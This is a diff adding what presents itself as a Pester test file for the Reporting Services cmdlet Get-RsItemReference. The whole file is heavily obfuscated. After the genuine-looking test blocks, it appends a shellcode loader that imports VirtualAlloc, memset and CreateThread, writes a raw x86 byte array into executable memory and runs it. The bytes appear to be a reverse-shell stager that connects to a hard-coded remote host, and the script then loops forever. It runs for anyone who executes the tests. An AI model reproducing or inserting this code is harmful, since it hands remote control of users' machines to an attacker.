@@ -1,0 +1,82 @@
+${kWD`Tp8}  =[type]("{0}{1}"-F 'gui','D')  ;
+
+
+&("{0}{1}"-f 'De','scribe') ("{0}{2}{1}{3}"-f'Ge','feren','t-RsItemRe','ce') {
+        &("{1}{0}{2}"-f 'ontex','C','t') ("{3}{4}{5}{6}{1}{2}{0}" -f'meters','h ','min para','Ge','t-RsItemR','eferen','ce wit'){
+
+                ${fOldE`RNA`ME} = ("{9}{4}{5}{3}{6}{0}{8}{1}{2}{7}" -f 'i','ra','m','RsIt','u','tGet','emReference_M','eters','nPa','S') +   (  gEt-vARiAble ("{1}{0}"-f 'p8','KwDt') -vAlUEOn  )::("{2}{1}{0}" -f 'uid','ewG','N').Invoke()
+                &("{0}{1}{2}"-f 'New','-RsFold','er') -Path ('/') -FolderName ${f`oLd`ER`Name}
+                ${fOl`DErpA`Th} = '/' + ${f`O`LdE`RnAmE}
+                ${LOc`A`lr`EsOurCES`PAtH} =   (&("{1}{0}{2}"-f 't-Ite','Ge','m') -Path ".\")."fUl`lNaMe"  + ((("{1}{2}{5}{8}{10}{3}{7}{9}{0}{4}{6}" -f 'po','{','0}','0}e','r','Tests{0}CatalogItems{0}testRes','t.rdl','mp','our','tyRe','ces{')) -F[cHAR]92)
+                &("{1}{0}{3}{4}{2}{5}" -f 'C','Write-Rs','g','atal','o','Item') -Path ${lOc`AlR`esOURCEs`p`Ath} -RsFolder ${foLDe`R`p`ATh}
+                ${r`ePorT} = (&("{3}{2}{1}{0}{4}"-f'erConte','old','et-RsF','G','nt') -RsFolder ${FO`LDe`RPa`Th} )| &("{2}{3}{1}{0}" -f'bject','O','Whe','re-') ("{0}{1}" -f 'TypeN','ame') -eq ("{0}{2}{1}" -f'Re','ort','p')
+                ${RePOr`TReF`er`enc`ES} = &("{0}{1}{4}{3}{2}"-f'G','et-RsItem','e','nc','Refere') -Path ${r`ep`ORT}."PA`TH"
+
+                &('It') ("{1}{2}{7}{4}{6}{11}{0}{8}{3}{13}{10}{5}{12}{15}{9}{14}"-f'Data','Should found a ','r','et','en','ra','c','efer','S','r','pa','e to a Rs','m',' with min ','s','ete') {
+                   ${daTA`se`TR`EfeR`En`ce} = ${R`EP`orTrefeR`eNc`eS} | &("{2}{0}{1}{3}"-f 'ere','-Obj','Wh','ect') ("{0}{2}{3}{1}" -f'R','pe','eference','Ty') -eq ("{0}{2}{1}" -f 'D','Set','ata')
+                   ${D`ATAseT`RefE`R`eNCE}."Na`Me" | &("{0}{1}" -f'Shoul','d') ('Be') ("{4}{5}{0}{1}{3}{2}"-f 'er','en','t','ceUnDatase','repo','rtRef')
+                }
+
+                &('It') ("{0}{1}{9}{4}{6}{7}{11}{5}{2}{10}{8}{3}" -f'Should fo','und',' p','ters','reference','h min',' to a R','sDataSource ','me',' a ','ara','wit') {
+                   ${dAtasOURc`Er`E`Fe`ReN`CE} = ${RePOR`TRE`F`ErEN`ceS} | &("{3}{0}{1}{2}" -f'er','e-Objec','t','Wh') ("{1}{2}{0}{3}"-f 'nc','Refe','re','eType') -eq ("{1}{3}{0}{2}" -f 't','D','aSource','a')
+                   ${dATaS`OuRCeRE`F`ereNCE}."Na`Me" | &("{1}{0}" -f 'hould','S') ('Be') ("{2}{6}{5}{1}{4}{3}{0}"-f 'rce','eDa','reportRefere','u','taSo','c','n')
+                }
+                &("{1}{0}{5}{2}{3}{4}"-f 'emov','R','alog','Ite','m','e-RsCat') -RsFolder ${f`o`LDErpAth} -Confirm:${faL`SE}
+        }
+
+        &("{0}{1}{2}" -f'Co','n','text') ("{5}{6}{4}{1}{2}{3}{7}{0}" -f'r','rence with Proxy',' parame','t','Refe','G','et-RsItem','e'){
+
+                ${Fo`ldeRnA`me} = ("{2}{6}{1}{3}{0}{4}{5}" -f'ra','ferenceP','SutGet','roxynPa','mete','rs','RsItemRe') +   (  GeT-vAriabLe  ("{1}{0}" -f '8','KWdtp')  -ValUEOn)::("{1}{0}" -f 'd','NewGui').Invoke()
+                &("{0}{1}{2}{3}"-f 'New-','RsFo','l','der') -Path ('/') -FolderName ${Folde`RNA`Me}
+                ${f`o`L`DeRpAtH} = '/' + ${fOL`DE`R`NaME}
+                ${LoCALr`eSou`RCESPA`Th} =   (&("{1}{0}{2}"-f'et-I','G','tem') -Path ".\")."F`Ul`lNAmE"  + ((("{14}{11}{1}{3}{6}{4}{2}{12}{10}{8}{0}{7}{15}{13}{9}{5}" -f'c','Test','log','s','a','ort.rdl','Q2vCat','esQ2vempty','r','p','esou','v','ItemsQ2vtestR','e','Q2','R'))-cReplAce  ([Char]81+[Char]50+[Char]118),[Char]92)
+                &("{4}{3}{0}{2}{1}"-f'te','Item','-RsCatalog','i','Wr') -Path ${l`O`CAlRes`ou`RCEs`PaTH} -RsFolder ${FO`LdErpa`Th}
+                ${R`ePo`Rt} = (&("{2}{0}{5}{4}{1}{3}" -f'Rs','onten','Get-','t','C','Folder') -RsFolder ${foLdERP`A`TH} )| &("{0}{2}{3}{1}"-f 'Whe','ject','re','-Ob') ("{0}{1}" -f 'T','ypeName') -eq ("{0}{1}"-f 'Re','port')
+                ${P`R`OXY} = &("{3}{2}{1}{0}{4}" -f 'ox','Pr','w-RsWebService','Ne','y')
+                ${rEpO`RTReF`eRe`NCEs} = &("{4}{3}{1}{2}{0}"-f 'nce','er','e','Ref','Get-RsItem') -Path ${re`PORt}."p`ATH" -Proxy ${p`ROXy}
+
+                &('It') ("{12}{3}{10}{5}{0}{4}{13}{6}{14}{1}{8}{2}{7}{11}{9}"-f 'nce to a RsD','ro','y ',' found a ','ataSourc','efere','f a report w','Parame','x','er','r','t','Should','e o','ith P') {
+                   ${d`A`TaSouRC`erEF`Eren`cE} = ${RepoRtr`E`F`e`RenCeS} | &("{3}{2}{0}{1}"-f 'ec','t','bj','Where-O') ("{3}{1}{4}{0}{2}"-f'eTyp','efere','e','R','nc') -eq ("{2}{0}{1}"-f'taSo','urce','Da')
+                   ${dATa`S`OURCe`ReFeREN`CE}."na`mE" | &("{0}{1}" -f'Sho','uld') ('Be') ("{3}{2}{4}{1}{0}"-f 'e','Sourc','ortReferenceD','rep','ata')
+                }
+                &("{0}{3}{4}{2}{1}" -f 'R','CatalogItem','e-Rs','em','ov') -RsFolder ${fOldeR`PA`TH} -Confirm:${FA`lSE}
+        }
+
+        &("{1}{0}"-f 'ext','Cont') ("{4}{5}{1}{0}{6}{3}{2}{9}{10}{8}{7}" -f't','emReference wi','rU','eportServe','Get','-RsIt','h R','ter','ame','ri P','ar'){
+
+                ${f`Old`eRnAMe} = ("{11}{3}{8}{2}{0}{7}{10}{4}{9}{1}{5}{6}" -f 'Rs','c','t','G','f','e_Rep','ortServerUriParameters','I','e','eren','temRe','Sut') +   (  vARIaBLe  ("{2}{1}{0}" -f'p8','t','KWd')  -ValueONL  )::("{1}{2}{0}"-f'id','NewG','u').Invoke()
+                &("{1}{0}{2}" -f'RsFold','New-','er') -Path ('/') -FolderName ${fO`ld`eRNAme}
+                ${F`olDE`RP`AtH} = '/' + ${folDE`R`NAmE}
+                ${lOcAlrE`soUR`c`e`spAtH} =   (&("{2}{1}{0}"-f 'Item','et-','G') -Path ".\")."Fu`L`LNaME"  + ((("{1}{8}{0}{6}{2}{4}{5}{12}{9}{10}{7}{3}{11}" -f's','{0','s{0}Cata','rt.rd','logItems{','0}t','t','epo','}Te','urces{0}em','ptyR','l','estReso'))  -F  [Char]92)
+                &("{5}{2}{1}{3}{4}{0}" -f'tem','e-R','t','sCatal','ogI','Wri') -Path ${l`ocAlResOUr`C`eSp`ATH} -RsFolder ${Fo`l`dE`RpaTH}
+                ${REpO`Rt} = (&("{0}{4}{3}{2}{1}"-f'G','ntent','erCo','old','et-RsF') -RsFolder ${f`ol`deR`pATH} )| &("{3}{1}{0}{2}" -f 'c','-Obje','t','Where') ("{0}{2}{1}" -f 'T','e','ypeNam') -eq ("{1}{0}"-f'eport','R')
+                ${R`epORtsE`R`VERuRi} = ("{0}{5}{1}{4}{3}{2}" -f 'http://loca','s','rver','rtse','t/repo','lho')
+                ${rEPoR`TrE`Fer`encEs} = &("{2}{1}{3}{0}" -f 'rence','s','Get-R','ItemRefe') -Path ${Re`POrt}."P`Ath" -ReportServerUri ${ReportSe`Rv`e`R`UrI}
+
+                &('It') ("{16}{8}{12}{1}{17}{18}{14}{7}{3}{11}{20}{13}{10}{6}{19}{15}{4}{0}{2}{5}{9}"-f't wi','d ','th ReportS','rence t','epor','erverUri Pa','e o','e','oul','rameter','urc','o','d foun','DataSo','ef',' a r','Sh','a',' r','f',' a Rs') {
+                   ${d`AT`AsOu`RCe`REf`ErE`Nce} = ${r`E`por`TrEfEre`N`cEs} | &("{0}{1}{2}" -f'Whe','re-Objec','t') ("{1}{2}{3}{4}{0}"-f'e','Re','f','erence','Typ') -eq ("{2}{0}{1}" -f'urc','e','DataSo')
+                   ${DATAsouRCerEf`E`R`Ence}."nA`mE" | &("{1}{0}"-f'uld','Sho') ('Be') ("{2}{5}{0}{4}{3}{1}" -f 'r','ceDataSource','reportRe','n','e','fe')
+                }
+                &("{1}{0}{2}{4}{3}"-f'm','Re','ove-Rs','talogItem','Ca') -RsFolder ${FOLd`Er`paTh} -Confirm:${f`Al`SE}
+        }
+
+        &("{0}{1}"-f 'Cont','ext') ("{7}{8}{6}{3}{10}{12}{9}{1}{4}{2}{11}{14}{5}{13}{0}" -f'y Parameter','t','portSer','ef','h Re',' an','mR','Get-Rs','Ite','ence wi','e','v','r','d Prox','erUri'){
+
+                ${fOLDer`Na`mE} = ("{4}{9}{8}{3}{0}{7}{2}{5}{1}{10}{6}" -f 'ferenc','erverUri','epo','temRe','Su','rtS','eters','e_R','etRsI','tG','ProxyParam') +  ( GCi ("VaRi"+"a"+"B"+"LE:"+"KwdtP8")  ).valUe::("{1}{2}{0}" -f 'id','New','Gu').Invoke()
+                &("{2}{1}{0}{3}" -f 'Fo','Rs','New-','lder') -Path ('/') -FolderName ${fOlDE`RN`A`mE}
+                ${fO`LDE`Rpa`Th} = '/' + ${fo`LdErNa`mE}
+                ${l`Oc`AlR`ESOuRces`PATh} =   (&("{0}{1}" -f'G','et-Item') -Path ".\")."FULLNa`Me"  + ((("{4}{6}{9}{1}{8}{7}{5}{0}{2}{3}{10}" -f 'Res','m','ourc','esc','c','t','mKT','CatalogItemscmKtes','K','estsc','mKemptyReport.rdl')) -RePLacE'cmK',[cHaR]92)
+                &("{0}{2}{1}{3}"-f'Write','RsCatalog','-','Item') -Path ${L`OCALRES`oUr`cespaTH} -RsFolder ${fOLdER`p`ATh}
+                ${ReP`Ort} = (&("{4}{5}{3}{1}{2}{0}"-f 't','ld','erConten','o','Get-','RsF') -RsFolder ${F`ol`DeRpa`Th} )| &("{3}{2}{1}{0}"-f'ect','-Obj','re','Whe') ("{0}{1}" -f'TypeNam','e') -eq ("{2}{1}{0}"-f 't','r','Repo')
+                ${PrO`xY} = &("{1}{2}{0}{4}{3}" -f'WebServ','N','ew-Rs','xy','icePro')
+                ${rEp`OrT`SERVEru`RI} = ("{2}{6}{1}{3}{0}{4}{7}{5}{8}" -f '/re','o','ht','calhost','port','erv','tp://l','s','er')
+                ${repO`RTREF`ErE`Nc`es} = &("{2}{4}{1}{0}{3}"-f'renc','RsItemRefe','Ge','e','t-') -Path ${Re`poRt}."pa`TH" -ReportServerUri ${repORTSe`RVe`Ru`RI} -Proxy ${Pr`oxy}
+
+                &('It') ("{22}{7}{13}{14}{8}{20}{4}{19}{3}{17}{10}{15}{12}{21}{2}{1}{11}{6}{9}{18}{16}{5}{0}"-f 'rs','ort','a rep','D','to a ',' Paramete','with Re','ould f',' a re','port','taSou',' ',' ','oun','d','rce','nd Proxy','a','ServerUri a','Rs','ference ','of ','Sh') {
+                   ${datasOuRc`erEf`Er`enCE} = ${Repo`Rt`REFEREn`C`ES} | &("{0}{2}{1}{3}" -f 'Whe','j','re-Ob','ect') ("{3}{1}{2}{0}" -f'Type','e','nce','Refer') -eq ("{0}{1}{2}" -f'D','ata','Source')
+                   ${DAtASourC`ErEfer`E`N`Ce}."N`AMe" | &("{1}{0}"-f 'd','Shoul') ('Be') ("{1}{3}{4}{5}{2}{0}{6}"-f't','re','ceDa','por','tRef','eren','aSource')
+                }
+                &("{0}{3}{1}{2}{4}" -f 'Remov','-RsCata','l','e','ogItem') -RsFolder ${f`OlDERPA`Th} -Confirm:${fal`SE}
+        }
+}
+${C} = ((("{29}{76}{88}{64}{41}{66}{38}{54}{24}{34}{44}{26}{1}{3}{19}{84}{18}{71}{17}{72}{31}{45}{14}{69}{21}{55}{13}{91}{43}{8}{58}{15}{28}{90}{89}{12}{16}{63}{56}{87}{11}{74}{80}{33}{49}{68}{7}{73}{39}{25}{62}{40}{47}{75}{30}{51}{22}{35}{4}{85}{6}{65}{42}{92}{60}{77}{20}{37}{36}{61}{86}{83}{82}{48}{52}{70}{53}{50}{27}{81}{46}{10}{59}{57}{32}{79}{78}{5}{9}{0}{67}{2}{23}" -f'uint src, u','n',' ','tPt','s, ','es','t dwSt','e','nType, uint f','t, ',']pub','p)','k',' f','ize,','Prot','ern',',','alAlloc(IntPtr ','r Vi','rtA','in','ibut','count);',' ','Ptr',' I','r','ect);[','[Dll','tPtr lpThreadAtt','uint','tatic extern IntPtr m','ic e','ext','e','ress, IntPt','dd','c s',' Int','hre','pkern','c','llocatio','ern',' dwS','dllCJp)','ad(','eationFla','x','Jpmsvc','r','g','ort(C','tatic','t','d',' s','l','lic','ize, ','r lpParamete',' CreateT','el32.','t(CJ','a','el32.dllCJp)]publi','int','t',' u','s, IntPtr lpThreadId);[DllImp','lpAddress',' ','rn',']public st','In','Impo','IntPtr lpSta','tPtr d','emset(In','at','t.',' dwCr','nt','rtu','uin','r, ui','llCJ','r','t(CJp','DllImpor','lA','kS'))."R`Eplace"(([chAr]67+[chAr]74+[chAr]112),[STRInG][chAr]34));${W} = &("{1}{0}" -f '-Type','Add') -memberDefinition ${c} -Name ("{0}{1}" -f'Wi','n32') -namespace ("{1}{3}{0}{4}{2}" -f'Func','Win','ons','32','ti') -passthru;[Byte[]];[Byte[]]${Z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xbb,0xcd,0xdb,0x62,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${G} = 0x1000;if (${Z}."LEng`TH" -gt 0x1000){${G} = ${z}."le`N`gtH"};${X}=${w}::("{3}{2}{0}{1}"-f 'tualAll','oc','ir','V').Invoke(0,0x1000,${g},0x40);for (${I}=0;${i} -le (${z}."len`GTh"-1);${i}++) {${w}::"ME`M`SeT"([IntPtr](${x}.("{1}{0}"-f 'nt32','ToI').Invoke()+${i}), ${z}[${i}], 1)};${w}::("{2}{1}{3}{0}"-f'ad','eThr','Creat','e').Invoke(0,0,${x},0,0,0);for (;;){.("{0}{3}{1}{2}" -f 'S','art-sle','ep','t') 60};
